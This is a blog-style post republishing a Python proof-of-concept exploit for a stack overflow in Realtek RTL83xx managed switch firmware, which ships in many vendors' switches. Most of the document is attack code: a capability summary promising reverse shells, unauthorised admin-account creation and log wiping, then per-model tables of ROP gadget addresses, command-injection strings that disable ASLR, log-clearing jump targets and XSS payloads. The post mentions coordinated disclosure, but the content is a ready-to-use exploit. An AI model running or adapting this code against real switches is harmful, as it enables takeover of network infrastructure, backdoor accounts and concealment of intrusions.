---
layout: post
title: Realtek Managed Switch Controller (RTL83xx) Stack Overflow
date: 2019-10-10 04:14 +0300
categories: [Exploits, Overflow]
tags: [exploits]
---








![](../../../assets/img/Exploits/realtek.png)

A proof-of-concept exploit has been developed for a stack overflow vulnerability in the Realtek Managed Switch Controller (RTL83xx).

  

```
MD5 | 2a3475b14eff7426d5bb3fa2a6e605d7
```

```perl
    #!/usr/bin/python2.7
    #
    """
    
    [Subject]
    
    Realtek Managed Switch Controller (RTL83xx) PoC (2019 bashis)
    https://www.realtek.com/en/products/communications-network-ics/category/managed-switch-controller
    
    [Brief description]
    
    1.Boa/Hydra suffer of exploitable stack overflow with a 'one byte read-write loop' w/o boundary check. (all FW version and vendors affected)
    Note: The vulnerability are _not_ from Boa nor Hydra, coming from Realtek additional coding
    2.Reuse of code between vendors gives almost indentical exploitation of found vulnerabilities
    3.Two strcpy() vulnerable fixed buffers next to each others in same function make it easy for jumping in Big Endian
    
    [Goals for this PoC]
    
    1.One Python PoC for all vendors
    Using dictionaries to have one 'template' for each vendor and another dictionary with unique details for each target, to be merged on the fly.
    The python code will read and use details from dictionary when verifying/exploiting
    
    2.Uniquely identify remote target
    ETag - Static and excellent tool for determine remote target, due to non-changing 'last modified' in same revision of Firmware
    
    ETag: xxxxx-yyyyy
    xxxxx = file size (up to 5 digits)
    yyyyy = last modified (up to 5 digits)
    
    3.Reverse shell
    MIPS Big Endian shellcode is the only option, as there are no 'netcat/telnet/stunnel.. etc' availible
    
    4.add/delete credentials for GUI/CLI
    Quite many of the firmware's has the 'option' to add valid credentials by unauthorized updating of 'running-config'
    For those who has added protection, we can add/delete credentials with an bit interesting jumping sequence
    
    [Technical brief]
    1.Stack       - Read/Write/Executable (Using CMD injection in the PoC to turn off ASLR)
    2.Heap        - Read/Write/Executable (No need to turn off, ASLR not turned on for heap)
    3.fork        - Boa/Hydra using forking shellcode, as I want try restart Boa/Hydra to avoid DoS after successful reverse shell
    
    Two vulnerable buffers with fixed size in same call, we overwrite $RA with four bytes, and overwrite first byte in $RA with second buffers NULL termination,
    this allows us to jump within the binary itself, and passing arguments for the function we jumping to by tailing these with the original request
    
    [Basically]
    First buffer:         [aaaaaaaa][0x58xxxxxx]('a' and 0x58 will be overwritten by second buffer)
    Second buffer: [bbbbb][bbbbbbbb][0x00xxxxxx](NULL termination will overwrite 0x58)
    
    [Known targets]
    
    All below is fully exploitable, with following exception:
    [*] ETag: 639-98866   [NETGEAR Inc. GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP v6.0.0.45]
    [*] ETag: 639-73124   [NETGEAR Inc. GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP v6.0.0.37]
    
    Not because they are not vulnerable, its because 1) their heap addresses lays at the '0x478000-0x47a000' range,
    and 2) they using obfuscation 'encode' for the password (99 bytes max), we can never reach the 'two buffers' jump method.
    [They are still fully exploitable with the Boa/Hydra vulnerability]
    
    Note:
    In this PoC I have only implemented few affected versions, in reality there is many more models and FW version affected.
    
    
    $ ./Realtek-RTL83xx-PoC.py --etag help
    
    [*] Realtek Managed Switch Controller RTL83xx PoC (2019 bashis)
    [*] RHOST: 192.168.57.20
    [*] RPORT: 80
    [*] LHOST: 192.168.57.1
    [*] LPORT: 1337
    [+] Target: List of known targets
    
    [*] ETag: 225-51973   [Cisco Systems, Inc. Sx220 v1.1.3.1]
    [*] ETag: 225-60080   [Cisco Systems, Inc. Sx220 v1.1.4.1]
    [*] ETag: 752-76347   [ALLNET GmbH Computersysteme ALL-SG8208M v2.2.1]
    [*] ETag: 225-21785   [Pakedgedevice & Software Inc SX-8P v1.04]
    [*] ETag: 222-71560   [Zyxel Communications Corp. GS1900-24 v2.40_AAHL.1_20180705]
    [*] ETag: 14044-509   [EnGenius Technologies, Inc. EGS2110P v1.05.20_150810-1754]
    [*] ETag: 13984-12788 [Open Mesh, Inc. OMS24 v01.03.24_180823-1626]
    [*] ETag: 218-22429   [PLANET Technology Corp. GS-4210-8P2S v1.0b171116]
    [*] ETag: 218-7473    [PLANET Technology Corp. GS-4210-24T2S v2.0b160727]
    [*] ETag: 752-95168   [DrayTek Corp. VigorSwitch P1100 v2.1.4]
    [*] ETag: 225-96283   [EDIMAX Technology Co., Ltd. GS-5424PLC v1.1.1.6]
    [*] ETag: 225-63242   [EDIMAX Technology Co., Ltd. GS-5424PLC v1.1.1.5]
    [*] ETag: 224-5061    [CERIO Corp. CS-2424G-24P v1.00.29]
    [*] ETag: 222-50100   [ALLNET GmbH Computersysteme ALL-SG8310PM v3.1.1-R3-B1]
    [*] ETag: 222-81176   [Shenzhen TG-NET Botone Technology Co,. Ltd. P3026M-24POE (V3) v3.1.1-R1]
    [*] ETag: 8028-89928  [Araknis Networks AN-310-SW-16-POE v1.2.00_171225-1618]
    [*] ETag: 222-64895   [Xhome DownLoop-G24M v3.0.0.43126]
    [*] ETag: 222-40570   [Realtek RTL8380-24GE-4GEC v3.0.0.43126]
    [*] ETag: 222-45866   [Abaniact AML2-PS16-17GP L2 v116B00033]
    [*] ETag: 14044-44104 [EnGenius Technologies, Inc. EWS1200-28TFP v1.07.22_c1.9.21_181018-0228]
    [*] ETag: 14044-32589 [EnGenius Technologies, Inc. EWS1200-28TFP v1.06.21_c1.8.77_180906-0716]
    [*] ETag: 609-31457   [NETGEAR Inc. GS750E ProSAFE Plus Switch v1.0.0.22]
    [*] ETag: 639-98866   [NETGEAR Inc. GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP v6.0.0.45]
    [*] ETag: 639-73124   [NETGEAR Inc. GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP v6.0.0.37]
    
    
    [*] All done...
    
    [Other vendors]
    These names have been found within some Firmware images, but not implemented as I have not found any Firmware images.
    (However, I suspect they use exact same Firmware due to the traces are 'logo[1-10].jpg/login[1-10].jpg')
    
    [*] 3One Data Communication, Saitian, Sangfor, Sundray, Gigamedia, GetCK, Hanming Technology, Wanbroad, Plexonics, Mach Power
    
    [Known bugs]
    1.Non-JSON:
    '/mntlog/flash.log' and '/var/log/flash.log' not always removed when using 'stack_cgi_log()'
    (Must change value for 'flash.log' that needs to be 0x02, 'flash.log' has value 0x00)
    
    [Responsible Disclosure]
    Working with VDOO since early February 2019 to disclosure found vulnerabilities to vendors
    https://www.vdoo.com/blog/disclosing-significant-vulnerabilities-network-switches
    
    
    [Technical details]
    Please read the code
    
    """
    # Have a nice day
    # /bashis
    #
    
    import string
    import sys
    import socket
    import argparse
    import urllib, urllib2, httplib
    import base64
    import ssl
    import hashlib
    import re
    import struct
    import time
    import thread
    import json
    import inspect
    import copy
    
    import hashlib
    from Crypto.Cipher import AES
    from Crypto.Cipher import PKCS1_v1_5
    from Crypto.PublicKey import RSA
    from Crypto import Random
    from random import randint
    
    from pwn import * # pip install pwn
    
    global debug
    debug = False
    global force
    force = False
    
    def DEBUG(direction, text):
    if debug:
    # Print send/recv data and current line number
    print "[BEGIN {}] <{:-^60}>".format(direction, inspect.currentframe().f_back.f_lineno)
    print "\n{}\n".format(text)
    print "[ END  {}] <{:-^60}>".format(direction, inspect.currentframe().f_back.f_lineno)
    return
    
    class HTTPconnect:
    
    def __init__(self, host, proto, verbose, creds, Raw):
    self.host = host
    self.proto = proto
    self.verbose = verbose
    self.credentials = creds
    self.Raw = Raw
    
    def Send(self, uri, query_headers, query_data,ID,encode_query):
    self.uri = uri
    self.query_headers = query_headers
    self.query_data = query_data
    self.ID = ID
    self.encode_query = encode_query
    
    # Connect-timeout in seconds
    #timeout = 5
    #socket.setdefaulttimeout(timeout)
    
    url = '{}://{}{}'.format(self.proto, self.host, self.uri)
    
    if self.verbose:
    log.info("[Verbose] Sending: {}".format(url))
    
    if self.proto == 'https':
    if hasattr(ssl, '_create_unverified_context'):
    #log.info("Creating SSL Unverified Context")
    ssl._create_default_https_context = ssl._create_unverified_context
    
    if self.credentials:
    Basic_Auth = self.credentials.split(':')
    if self.verbose:
    log.info("[Verbose] User: {}, Password: {}".format(Basic_Auth[0],Basic_Auth[1]))
    try:
    pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
    pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
    auth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)
    opener = urllib2.build_opener(auth_handler)
    urllib2.install_opener(opener)
    except Exception as e:
    log.info("Basic Auth Error: {}".format(e))
    sys.exit(1)
    
    if self.query_data:
    #request = urllib2.Request(url, data=json.dumps(self.query_data), headers=self.query_headers)
    if self.query_data and self.encode_query:
    request = urllib2.Request(url, data=urllib.urlencode(self.query_data,doseq=True), headers=self.query_headers)
    else:
    request = urllib2.Request(url, data=self.query_data, headers=self.query_headers)
    
    if self.ID:
    request.add_header('Cookie', self.ID)
    else:
    request = urllib2.Request(url, None, headers=self.query_headers)
    if self.ID:
    request.add_header('Cookie', self.ID)
    response = urllib2.urlopen(request)
    #if response:
    #print "[<] {} OK".format(response.code)
    
    if self.Raw:
    return response
    else:
    html = response.read()
    return html
    
    #
    # Validate correctness of HOST, IP and PORT
    #
    class Validate:
    
    def __init__(self,verbose):
    self.verbose = verbose
    
    # Check if IP is valid
    def CheckIP(self,IP):
    self.IP = IP
    
    ip = self.IP.split('.')
    if len(ip) != 4:
    return False
    for tmp in ip:
    if not tmp.isdigit():
    return False
    i = int(tmp)
    if i < 0 or i > 255:
    return False
    return True
    
    # Check if PORT is valid
    def Port(self,PORT):
    self.PORT = PORT
    
    if int(self.PORT) < 1 or int(self.PORT) > 65535:
    return False
    else:
    return True
    
    # Check if HOST is valid
    def Host(self,HOST):
    self.HOST = HOST
    
    try:
    # Check valid IP
    socket.inet_aton(self.HOST) # Will generate exeption if we try with FQDN or invalid IP
    # Now we check if it is correct typed IP
    if self.CheckIP(self.HOST):
    return self.HOST
    else:
    return False
    except socket.error as e:
    # Else check valid FQDN name, and use the IP address
    try:
    self.HOST = socket.gethostbyname(self.HOST)
    return self.HOST
    except socket.error as e:
    return False
    
    class Vendor:
    
    def __init__(self, ETag):
    self.ETag = ETag
    
    def random_string(self,length):
    self.length = length
    
    return "a" * self.length
    #return ''.join(random.choice(string.lowercase) for i in range(self.length))
    
    #
    # Source: https://gist.github.com/angstwad/bf22d1822c38a92ec0a9
    #
    def dict_merge(self, dct, merge_dct):
    """ Recursive dict merge. Inspired by :meth:``dict.update()``, instead of
    updating only top-level keys, dict_merge recurses down into dicts nested
    to an arbitrary depth, updating keys. The ``merge_dct`` is merged into
    ``dct``.
    :param dct: dict onto which the merge is executed
    :param merge_dct: dct merged into dct
    :return: None
    """
    for k, v in merge_dct.iteritems():
    if (k in dct and isinstance(dct[k], dict)
    and isinstance(merge_dct[k], collections.Mapping)):
    self.dict_merge(dct[k], merge_dct[k])
    else:
    dct[k] = merge_dct[k]
    
    
    #
    # Difference between vendors and Firmware versions.
    # The update code will search below and update the template on the fly
    # (you can tweak and add code in the template from here)
    #
    # ETag - excellent tool for determine the target
    #
    # ETag: xxxxx-yyyyy
    # xxxxx = file size (up to 5 digits)
    # yyyyy = last modified (up to 5 digits)
    #
    def dict(self):
    
    Vendor_ETag = {
    #
    # PLANET Technology Corp.
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : No
    # Del /mntlog/flash.log  : No
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '218-22429': {
    'template':'Planet',# Static for the vendor
    'version':'1.0b171116',# Version / binary dependent stuff
    'model':'GS-4210-8P2S',# Model
    'uri':'https://www.planet.com.tw/en/product/GS-4210-8P2S',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E04C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99851c,# la $t9, system) # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x2484029c,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_diag': {
    # Ping IPv4
    'sys_ping_post_cmd':'ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/check;&count=1',
    'verify_uri':'/tmp/check',
    'web_sys_ping_post':0x423B9C,# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_ping_post()
    # traceroute
    #'sys_ping_post_cmd':'ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/check;&tr_maxhop=30&count=1',
    #'verify_uri':'/tmp/check',
    #'web_sys_ping_post':0x4243FC,# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_trace_route_post()
    'vulnerable': True,
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
    'log_settings_set':0x489368,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_ramClear':0x48AB84,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_fileClear':0x48C240,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntp_set':0x42DA80,# Jump one after 'sw $ra'# Set SNTP Server (Inject CMD)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntpDel_set':0x42DA80,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
    'sys_timeSettings_set':0x42C868,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'dispatcher.cgi',# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
    'START':0x7ffeee04,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'usr_nop': 64,# NOP sled (shellcode will be tailed)
    'pwd_nop': 45,# filler/garbage (not used for something constructive)
    'align': 3,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    '218-7473': {
    'template':'Planet',# Static for the vendor
    'version':'2.0b160727',# Version / binary dependent stuff
    'model':'GS-4210-24T2S',# Model
    'uri':'https://www.planet.com.tw/en/product/GS-4210-24T2S',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E04C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99851c,# la $t9, system) # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x2484029c,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_diag': {
    # Ping IPv4
    'sys_ping_post_cmd':'ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/check;&count=1',
    'verify_uri':'/tmp/check',
    'web_sys_ping_post':0x424594,# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_ping_post()
    
    # traceroute
    #'sys_ping_post_cmd':'ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/check;&tr_maxhop=30&count=1',
    #'verify_uri':'/tmp/check',
    #'web_sys_ping_post':0x424DF4,# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_trace_route_post()
    'vulnerable': True,
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
    'log_settings_set':0x48AA98,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_ramClear':0x48D9F4,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_fileClear':0x48D9F4,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntp_set':0x42E474,# Jump one after 'sw $ra'# Set SNTP Server (Inject CMD)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntpDel_set':0x42E474,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
    'sys_timeSettings_set':0x42D25c,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'dispatcher.cgi',# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
    'START':0x7ffeee04,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'usr_nop': 64,# NOP sled (shellcode will be tailed)
    'pwd_nop': 45,# filler/garbage (not used for something constructive)
    'align': 3,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # Cisco Systems, Inc.
    # Sx220 Series
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : Yes
    # Del /mntlog/flash.log  : Yes
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '225-51973': {
    'template':'Cisco',# Static for the vendor
    'version':'1.1.3.1',# Version / binary dependent stuff
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40F70C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f998524,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x2484683c,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_diag': {
    # /sqfs/home/web/cgi/set.cgi;  cgi_sys_ping_set()
    # Ping IPv4
    'web_sys_ping_post':0x43535C,# Jump one after 'sw $ra'# (address, binary dependent)
    'sys_ping_post_cmd':'&srvHost=127.0.0.1 ";echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;"&count=1',
    'sys_ping_post_check':'',
    
    # /sqfs/home/web/cgi/set.cgi;  cgi_sys_tracert_set()
    # traceroute
    #'web_sys_ping_post':0x43567C,# Jump one after 'sw $ra'# (address, binary dependent)
    #'sys_ping_post_cmd':'&srvHost=127.0.0.1 ";echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;"&count=1',
    #'sys_ping_post_check':'',
    
    'verify_uri':'/tmp/check',
    'vulnerable': True,#
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi/set.cgi; cgi_log_settings_set()
    'log_settings_set':0x436FDC,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_ramClear_set()
    'log_ramClear':0x436F34,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_fileClear_set()
    'log_fileClear':0x436F88,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntp_set()
    'sys_timeSntp_set':0x434FB0,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntpDel_set()
    'sys_timeSntpDel_set':0x4350D8,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSettings_set()
    'sys_timeSettings_set':0x434140,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'set.cgi',# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
    'START':0x7ffeff04,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'usr_nop': 64,# NOP sled (shellcode will be tailed)
    'pwd_nop': 77,# filler/garbage (not used for something constructive)
    'align': 3,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    '225-60080': {
    'template':'Cisco',# Static for the vendor
    'version':'1.1.4.1',# Version / binary dependent stuff
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40ffac,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f998530,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x24847b6c,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_diag': {
    # /sqfs/home/web/cgi/set.cgi;  cgi_sys_ping_set()
    # Ping IPv4
    'web_sys_ping_post':0x43535C,# Jump one after 'sw $ra'# (address, binary dependent)
    'sys_ping_post_cmd':'&srvHost=127.0.0.1 ";echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;"&count=1',
    'sys_ping_post_check':'',
    
    # /sqfs/home/web/cgi/set.cgi;  cgi_sys_tracert_set()
    # traceroute
    #'web_sys_ping_post':0x43567C,# Jump one after 'sw $ra'# (address, binary dependent)
    #'sys_ping_post_cmd':'&srvHost=127.0.0.1 ";echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;"&count=1',
    #'sys_ping_post_check':'',
    
    'verify_uri':'/tmp/check',
    'vulnerable': True,#
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi/set.cgi; cgi_log_settings_set()
    'log_settings_set':0x436FDC,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_ramClear_set()
    'log_ramClear':0x436F34,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_fileClear_set()
    'log_fileClear':0x436F88,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntp_set()
    'sys_timeSntp_set':0x434FB0,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntpDel_set()
    'sys_timeSntpDel_set':0x4350D8,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSettings_set()
    'sys_timeSettings_set':0x434140,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'set.cgi',# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
    'START':0x7ffeff04,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'usr_nop': 64,# NOP sled (shellcode will be tailed)
    'pwd_nop': 77,# filler/garbage (not used for something constructive)
    'align': 3,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # EnGenius Technologies, Inc.
    # EGS series
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : Yes
    # Del /mntlog/flash.log  : Yes
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '14044-509': {
    'template':'EnGenius',# Static for the vendor
    'version':'1.05.20_150810-1754',# Version / binary dependent stuff
    'model':'EGS2110P',# Model
    'uri':'https://www.engeniustech.com/engenius-products/8-port-gigabit-smart-switch-egs2110p/',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E12C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99851c,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x248405a0,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_diag': {
    # /sqfs/home/web/cgi-bin/datajson.cgi;  sn_tracertSet()
    # traceroute
    'web_sys_ping_post': 0x42382C,# Jump one after 'sw $ra'# (address, binary dependent)
    'sys_ping_post_cmd':'&ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check #&mh=30&uid=0',
    'sys_ping_post_check':'',
    'verify_uri':'/conf_tmp/check',
    
    'vulnerable': True,#
    },
    'stack_cgi_add_account': {
    # pt: 0 = no password, 1 = cleartext, 2 = encrypted
    # /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
    'address':0x423E74,# Jump one after 'sw $ra'# (address, binary dependent)
    'account':'&na=USERNAME&pt=2&pw=PASSWORD&pwn=PASSWORD&pv=0&op=1&',# Admin, priv 15
    'vulnerable': True,
    },
    'stack_cgi_del_account': {
    # /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
    'address':0x423E74,# Jump one after 'sw $ra'# (address, binary dependent)
    'account':'&na=USERNAME&pt=2&pv=0&op=0',#
    'vulnerable': True,#
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_globalSet()
    'log_settings_set':0x43DE18,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
    'log_ramClear':0x43F934,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
    'log_fileClear':0x43F934,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
    'sys_timeSntp_set':0x424844,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntpDel_set()
    'sys_timeSntpDel_set':0x424844,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSettings_set()
    'sys_timeSettings_set':0x424844,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'security.cgi',# /sqfs/home/web/cgi-bin/security.cgi; main()
    'START':0x100181A0,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x104006A0,# end: You may want to play with this if you dont get it working
    'usr_nop': 987,# NOP sled (shellcode will be tailed)
    'pwd_nop': 69,# filler/garbage (not used for something constructive)
    'align': 0,# Align opcodes in memory
    'stack':False,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # EnGenius Technologies, Inc.
    # EWS series
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : Yes
    # Del /mntlog/flash.log  : Yes
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '14044-32589': {
    'template':'EnGenius',# Static for the vendor
    'version':'1.06.21_c1.8.77_180906-0716',# Version / binary dependent stuff
    'model':'EWS1200-28TFP',# Model
    'uri':'https://www.engeniustech.com/engenius-products/managed-poe-network-switch-ews1200-28tfp/',
    'verify': {
    'cpl_locallogin.cgi (XSS)': {
    'description':'XSS in "redirecturl,userurl,loginurl,username,password" (PoC: Count passed XSS)',
    'authenticated': False,
    'response':'xss',
    'Content-Type':False,
    'uri':'/cgi-bin/cpl_locallogin.cgi?redirecturl=<script>alert(XSS);</script>&userurl=<script>alert(XSS);</script>&loginurl=<script>alert(XSS);</script>',
    'content':'username=<script>alert(XSS);</script>&password=<script>alert(XSS);</script>',
    'check_uri':False,
    'content_check':False,
